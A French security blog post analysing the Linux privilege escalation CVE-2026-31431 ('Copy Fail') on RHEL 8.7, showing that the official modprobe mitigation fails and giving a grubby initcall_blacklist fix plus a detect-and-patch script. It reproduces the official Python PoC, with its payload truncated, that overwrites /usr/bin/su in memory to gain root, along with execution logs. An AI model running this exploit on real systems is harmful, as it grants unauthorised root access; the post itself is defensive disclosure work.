---
title: "CVE-2026-31431 — Copy Fail : la mitigation fournie ne fonctionne pas sur RHEL 8.7"
date: 2026-05-08
description: "Analyse de CVE-2026-31431 (Copy Fail) sur RHEL 8.7 : demonstration que la mitigation officielle est inefficace en raison de la compilation builtin d'algif_aead, et presentation de la mitigation correcte via initcall_blacklist."
tags:
  - CVE
  - Linux
  - RHEL
  - LPE
  - Kernel
  - Copy Fail
categories:
  - PoC
draft: false
---
 
## TL;DR
 
Copy Fail (CVE-2026-31431) permet à un utilisateur local non privilégié d'obtenir un shell root en 732 octets de Python.
La mitigation officielle publiée sur [copy.fail](https://copy.fail) est sans effet sur RHEL 8.7 car `algif_aead` est compile directement dans le kernel (`CONFIG_CRYPTO_USER_API_AEAD=y`).
La mitigation correcte passe par `initcall_blacklist` via `grubby`, documentée dans l'[issue #73](https://github.com/theori-io/copy-fail-CVE-2026-31431/issues/73) du dépot officiel.
 
---
 
## Environnement
 
```
OS     : Red Hat Enterprise Linux 8.7 (Ootpa)
Kernel : 4.18.0-425.3.1.el8.x86_64
VM     : VMware Workstation — hors reseau, aucune mise a jour appliquee
Compte : lowpriv (utilisateur standard, pas de sudo)
```
 
---
 
## La vulnérabilité
 
La faille est localisée dans `algif_aead`, introduite en aout 2017 dans `authencesn`.
En chaînant un socket `AF_ALG`, `splice()` et le page cache du kernel, l'exploit ecrit 4 octets dans la représentation memoire de `/usr/bin/su` sans toucher le fichier sur le disque.
 
```
lowpriv
  -> socket(AF_ALG, SOCK_SEQPACKET)
  -> bind("aead", "authencesn(hmac(sha256),cbc(aes))")
  -> splice() -> page cache /usr/bin/su
  -> exec binaire modifie en memoire
  -> shell root
```
 
Le PoC officiel :
 
```python
#!/usr/bin/env python3
import os as g, zlib, socket as s
def d(x): return bytes.fromhex(x)
def c(f, t, c):
    a = s.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    h = 279; v = a.setsockopt
    v(h, 1, d('0800010000000010'+'0'*64))
    v(h, 5, None, 4)
    u, _ = a.accept(); o = t+4; i = d('00')
    u.sendmsg([b"A"*4+c], [(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3)], 32768)
    r, w = g.pipe(); n = g.splice
    n(f, w, o, offset_src=0); n(r, u.fileno(), o)
    try: u.recv(8+t)
    except: 0
f = g.open("/usr/bin/su", 0); i = 0
e = zlib.decompress(d("78daab77f57163626464800126063b06..."))
while i < len(e): c(f, i, e[i:i+4]); i += 4
g.system("su")
```
 
Execution :
 
```
[lowpriv@localhost ~]$ whoami
lowpriv
[lowpriv@localhost ~]$ sudo -l
Sorry, user lowpriv may not run sudo on localhost.
[lowpriv@localhost ~]$ python3.12 poc.py
[root@localhost lowpriv]#
```
 
---
 
## Pourquoi la mitigation officielle echoue
 
La mitigation documentée sur copy.fail consiste a désactivée le module `algif_aead` :
 
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead
```
 
Sur RHEL 8.7 :
 
```
[root@localhost ~]# rmmod algif_aead
rmmod: ERROR: Module algif_aead is builtin.
```
 
La cause :
 
```
[root@localhost ~]# grep CONFIG_CRYPTO_USER_API_AEAD /boot/config-$(uname -r)
CONFIG_CRYPTO_USER_API_AEAD=y
```
 
La valeur `=y` signifie que le module est compilé directement dans le kernel.
`rmmod` est sans effet. La blacklist `modprobe.d` est ignoree.
Le module n'apparait pas dans `lsmod`, ce qui rend toute verification naive incorrecte.
 
| Config | Type | rmmod | modprobe blacklist |
|--------|------|-------|--------------------|
| `=y`   | Builtin | Sans effet | Ignoree |
| `=m`   | Module  | Fonctionne | Efficace |
 
Sur l'ensemble de la famille RHEL 8.x, `algif_aead=y`. Le vecteur d'attaque est resté ouvert.
 
Preuve apres application de la mitigation officielle :
 
```
[lowpriv@localhost ~]$ python3.12 poc.py
[root@localhost lowpriv]#
```
 
---
 
## La mitigation correcte
 
Source : [issue #73](https://github.com/theori-io/copy-fail-CVE-2026-31431/issues/73) du dépot officiel.
 
`algif_aead` étant builtin, il s'initialise via une `initcall` au démarrage.
Le parametre kernel `initcall_blacklist` permet de bloquer cette initialisation avant que le systeme ne soit opérationnel.
 
```bash
grubby --update-kernel=ALL --args="initcall_blacklist=algif_aead_init"
reboot
```
 
Verification post-reboot :
 
```
[lowpriv@localhost ~]$ grep algif_aead_init /proc/cmdline
BOOT_IMAGE=... initcall_blacklist=algif_aead_init
```
 
Resultat :
 
```
[lowpriv@localhost ~]$ python3.12 poc.py
Traceback (most recent call last):
  ...
FileNotFoundError: [Errno 2] No such file or directory
```
 
Le socket AEAD ne peut plus etre binde. L'exploit ne progresse pas.
 
---
 
## Script detect & patch
 
Pour automatiser la detection et la mitigation, le script `copyfail.sh` teste directement le vecteur reel (bind du socket AEAD) plutot que de s'appuyer sur `lsmod`, inoperant dans le cas builtin.
 
```bash
./copyfail.sh /detect          # user standard
sudo ./copyfail.sh /patch      # root requis
```
 
Logique de detection :
 
1. Version du kernel (fenetre vulnerable >= 4.13)
2. Type de `algif_aead` : builtin `=y` ou module `=m`
3. Presence de `initcall_blacklist` dans `/proc/cmdline` et GRUB
4. Bind du socket AEAD (verdict final)
5. Binaires setuid accessibles
Logique de mitigation :
 
- `algif_aead=y` (RHEL) : `grubby` + reboot requis
- `algif_aead=m` (Ubuntu, Debian) : `rmmod` + `modprobe blacklist`, effectif immediatement
Code source :
 
```bash
#!/usr/bin/env bash
# CVE-2026-31431 - Copy Fail | detect & patch v2.1
 
set -euo pipefail
export PATH=$PATH:/sbin:/usr/sbin
 
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BOLD='\033[1m'; NC='\033[0m'
 
check_aead_builtin() {
    local config="/boot/config-$(uname -r)"
    [[ -f "$config" ]] && grep "^CONFIG_CRYPTO_USER_API_AEAD=" "$config" | cut -d= -f2 || echo "unknown"
}
 
check_aead_socket() {
    python3 - <<'EOF' 2>/dev/null
import socket, sys
try:
    a = socket.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    a.close(); sys.exit(0)
except: sys.exit(1)
EOF
}
 
check_initcall_active() {
    grep -q "initcall_blacklist=algif_aead_init" /proc/cmdline 2>/dev/null
}
 
check_initcall_grub() {
    command -v grubby &>/dev/null && \
        grubby --info=ALL 2>/dev/null | grep -q "initcall_blacklist=algif_aead_init"
}
 
cmd_detect() {
    local mitigations=()
    KERNEL=$(uname -r)
    AEAD_MODE=$(check_aead_builtin)
 
    echo -e "\n${BOLD}[1] Kernel${NC}"
    echo -e "    Version : $KERNEL"
    local major minor
    major=$(echo "$KERNEL" | cut -d. -f1)
    minor=$(echo "$KERNEL" | cut -d. -f2)
    [[ "$major" -gt 4 || ("$major" -eq 4 && "$minor" -ge 13) ]] && \
        echo -e "    Plage   : ${RED}Vulnerable (>= 4.13)${NC}" || \
        echo -e "    Plage   : ${GREEN}Non vulnerable${NC}"
 
    echo -e "\n${BOLD}[2] algif_aead${NC}"
    case "$AEAD_MODE" in
        y) echo -e "    Type    : ${YELLOW}BUILTIN =y${NC}"
           echo -e "    rmmod   : ${RED}INEFFICACE${NC}"
           echo -e "    modprobe: ${RED}INEFFICACE${NC}" ;;
        m) echo -e "    Type    : Module =m"
           lsmod 2>/dev/null | grep -q "^algif_aead" && \
               echo -e "    Charge  : ${RED}OUI${NC}" || \
               echo -e "    Charge  : ${GREEN}NON${NC}"
           grep -rq "install algif_aead /bin/false" /etc/modprobe.d/ 2>/dev/null && \
               { echo -e "    Blacklist: ${GREEN}OUI${NC}"; mitigations+=("modprobe blacklist"); } || \
               echo -e "    Blacklist: ${YELLOW}NON${NC}" ;;
        *) echo -e "    Type    : ${YELLOW}Inconnu${NC}" ;;
    esac
 
    echo -e "\n${BOLD}[3] initcall_blacklist${NC}"
    check_initcall_active && \
        { echo -e "    Actif   : ${GREEN}OUI (/proc/cmdline)${NC}"; mitigations+=("initcall_blacklist actif"); } || \
        echo -e "    Actif   : ${RED}NON${NC}"
    check_initcall_grub 2>/dev/null && \
        echo -e "    GRUB    : ${GREEN}OUI (persistant)${NC}" || \
        echo -e "    GRUB    : ${YELLOW}NON configure${NC}"
 
    echo -e "\n${BOLD}[4] Test socket AEAD${NC}"
    echo -e "    Test    : bind(AF_ALG, aead, authencesn(hmac(sha256),cbc(aes)))"
    if check_aead_socket; then
        echo -e "    Resultat: ${RED}ACCESSIBLE${NC}"
    else
        echo -e "    Resultat: ${GREEN}INACCESSIBLE${NC}"
        mitigations+=("Socket AEAD inaccessible")
    fi
 
    echo -e "\n${BOLD}[5] Setuid (cibles)${NC}"
    find /usr/bin /bin /usr/sbin /sbin -perm -4000 -readable 2>/dev/null | head -5 | \
        while read -r b; do echo -e "    ${RED}x${NC} $b"; done
 
    echo -e "\n${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    if check_aead_socket 2>/dev/null; then
        echo -e "${RED}${BOLD}  VULNERABLE - CVE-2026-31431${NC}"
        [[ "$AEAD_MODE" == "y" ]] && \
            echo -e "  algif_aead BUILTIN : sudo ./copyfail.sh /patch (grubby + reboot)" || \
            echo -e "  sudo ./copyfail.sh /patch"
    else
        echo -e "${GREEN}${BOLD}  MITIGE - vecteur AEAD inaccessible${NC}"
        for m in "${mitigations[@]}"; do echo -e "    * $m"; done
        echo -e "\n  Referentiel : https://access.redhat.com/security/cve/cve-2026-31431"
    fi
    echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
}
 
cmd_patch() {
    [[ $EUID -ne 0 ]] && { echo -e "${RED}root requis${NC}"; exit 1; }
 
    AEAD_MODE=$(check_aead_builtin)
 
    if [[ "$AEAD_MODE" == "y" ]]; then
        echo -e "${YELLOW}algif_aead BUILTIN : rmmod/modprobe inefficaces${NC}"
        echo -e "Methode : initcall_blacklist via grubby\n"
 
        echo -e "${BOLD}[1/3] grubby${NC}"
        if check_initcall_grub 2>/dev/null; then
            echo -e "  ${GREEN}OK${NC} Deja configure"
        else
            grubby --update-kernel=ALL --args="initcall_blacklist=algif_aead_init"
            echo -e "  ${GREEN}OK${NC} Parametre ajoute"
        fi
 
        echo -e "\n${BOLD}[2/3] Modprobe blacklist${NC}"
        echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif-aead.conf
        echo -e "  ${GREEN}OK${NC} /etc/modprobe.d/disable-algif-aead.conf"
        echo -e "  ${YELLOW}Note${NC} Seul grubby est efficace sur builtin"
 
        echo -e "\n${BOLD}[3/3] initramfs${NC}"
        command -v dracut &>/dev/null && \
            { dracut --force 2>/dev/null && echo -e "  ${GREEN}OK${NC} regenere"; } || \
            echo -e "  ${YELLOW}WARN${NC} dracut introuvable"
 
        echo -e "\n${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${YELLOW}${BOLD}  REBOOT REQUIS${NC}"
        echo -e "  Apres reboot : ./copyfail.sh /detect"
        echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    else
        echo -e "${BOLD}[1/3] modprobe blacklist${NC}"
        echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif-aead.conf
        echo -e "  ${GREEN}OK${NC} cree"
 
        echo -e "\n${BOLD}[2/3] rmmod${NC}"
        lsmod 2>/dev/null | grep -q "^algif_aead" && \
            { rmmod algif_aead 2>/dev/null && echo -e "  ${GREEN}OK${NC} decharge"; } || \
            echo -e "  ${GREEN}OK${NC} deja non charge"
 
        echo -e "\n${BOLD}[3/3] initramfs${NC}"
        command -v dracut &>/dev/null && \
            { dracut --force 2>/dev/null && echo -e "  ${GREEN}OK${NC}"; } || \
        command -v update-initramfs &>/dev/null && \
            { update-initramfs -u 2>/dev/null && echo -e "  ${GREEN}OK${NC}"; }
 
        echo -e "\n${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${GREEN}${BOLD}  MITIGATION APPLIQUEE${NC}"
        echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    fi
 
    echo -e "Patch kernel RHEL 8.10 : https://access.redhat.com/security/cve/cve-2026-31431\n"
}
 
case "${1:-}" in
    /detect|detect|-d) cmd_detect ;;
    /patch|patch|-p)   cmd_patch  ;;
    *) echo -e "Usage:\n  ./copyfail.sh /detect\n  ./copyfail.sh /patch (root)\n" ;;
esac
```
 
---
 
## Synthese
 
| Methode | Resultat sur RHEL 8.7 |
|---------|----------------------|
| `rmmod algif_aead` | Echec : module builtin |
| `modprobe.d` blacklist | Sans effet |
| `grubby initcall_blacklist` | Efficace apres reboot |
| `./copyfail.sh /detect` | Retourne VULNERABLE / MITIGE |
 
---
 
## References
 
- [copy.fail](https://copy.fail) — Advisory CVE-2026-31431
- [Issue #73](https://github.com/theori-io/copy-fail-CVE-2026-31431/issues/73) — Mitigation builtin RHEL
- [RHSB-2026-02](https://access.redhat.com/security/vulnerabilities/RHSB-2026-02) — Red Hat Security Bulletin
- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-31431) — CVE-2026-31431
---
 
## Video
 
{{< video "/videos/copyfail.mp4" >}}
 
Déroulement :
 
1. `cat /etc/redhat-release` + `whoami` + `sudo -l` (pas de privileges)
2. `python3.12 poc.py` — obtention du shell root
3. Application de la mitigation officielle copy.fail
4. `python3.12 poc.py` — shell root malgre la mitigation
5. `./copyfail.sh /detect` — systeme identifie VULNERABLE
6. `./copyfail.sh /patch` — mitigation grubby + reboot
7. `python3.12 poc.py` — FileNotFoundError
8. `./copyfail.sh /detect` — systeme identifie MITIGE